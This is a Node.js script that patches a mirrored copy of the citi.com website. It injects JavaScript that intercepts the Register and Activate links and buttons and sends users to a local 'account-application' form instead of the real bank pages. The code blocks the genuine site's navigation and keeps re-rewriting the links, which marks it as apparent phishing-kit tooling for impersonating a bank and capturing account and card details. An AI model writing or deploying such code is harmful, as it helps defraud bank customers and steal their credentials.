/*
 * Additive bridge: make the mirrored site's Register / Activate controls open
 * the local account-application form instead of the real citi.com pages.
 *
 * Only Register and Activate links are affected (the main navigation, including
 * "Open an Account", is left untouched). The interceptor runs in the capture
 * phase so the mirrored Angular app cannot navigate to citi.com first.
 *
 * Usage: node patch-register-bridge.js
 */
const fs = require('fs');
const path = require('path');

const SCRIPT = `
<script id="mirror-account-application-bridge">
(function () {
  var TARGET = '/account-application/';
  function classify(el) {
    if (!el) return null;
    var id = el.id || '';
    if (id === 'register_acc') return 'register';
    if (id === 'activate_card') return 'activate';

    var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
    if (/registration\\/set-up-online-access/i.test(href)) return 'register';
    if (/\\/US\\/ag\\/activate(\\/|$|\\?)/i.test(href)) return 'activate';

    var text = (el.textContent || '').replace(/\\s+/g, ' ').trim().toLowerCase();
    if (/^register( now| for online access)?$/.test(text)) return 'register';
    if (/^(activate|activate a card|activate account|activate your account)$/.test(text)) return 'activate';
    return null;
  }

  function targetUrl(mode) {
    return TARGET + '?mode=' + (mode === 'activate' ? 'activate' : 'register');
  }

  document.addEventListener('click', function (event) {
    var el = event.target && event.target.closest ? event.target.closest('a, button') : null;
    var mode = classify(el);
    if (!mode) return;
    event.preventDefault();
    event.stopPropagation();
    if (event.stopImmediatePropagation) event.stopImmediatePropagation();
    window.location.assign(targetUrl(mode));
  }, true);

  function rewrite() {
    var anchors = document.querySelectorAll('a');
    for (var i = 0; i < anchors.length; i++) {
      var a = anchors[i];
      var mode = classify(a);
      if (!mode) continue;
      var url = targetUrl(mode);
      if (a.getAttribute('href') !== url) a.setAttribute('href', url);
    }
  }

  rewrite();
  if (window.MutationObserver) {
    new MutationObserver(rewrite).observe(document.documentElement, {
      subtree: true, childList: true, attributes: true, attributeFilter: ['href', 'id']
    });
  }
})();
</script>
`;

const targets = [
  path.join('public', 'index.html'),
  path.join('public', 'US', 'ag', 'contactus', 'index.html')
];

for (const rel of targets) {
  const fp = path.join(process.cwd(), rel);
  if (!fs.existsSync(fp)) { console.log('skip (missing):', rel); continue; }

  let html = fs.readFileSync(fp, 'utf8');
  const existing = /<script id="mirror-account-application-bridge">[\s\S]*?<\/script>\n?/;

  if (existing.test(html)) {
    html = html.replace(existing, SCRIPT.trim() + '\n');
    fs.writeFileSync(fp, html);
    console.log('updated register/activate bridge:', rel);
    continue;
  }

  const idx = html.lastIndexOf('</body>');
  if (idx === -1) { console.log('no </body> found:', rel); continue; }
  html = html.slice(0, idx) + SCRIPT + html.slice(idx);
  fs.writeFileSync(fp, html);
  console.log('installed register/activate bridge:', rel);
}
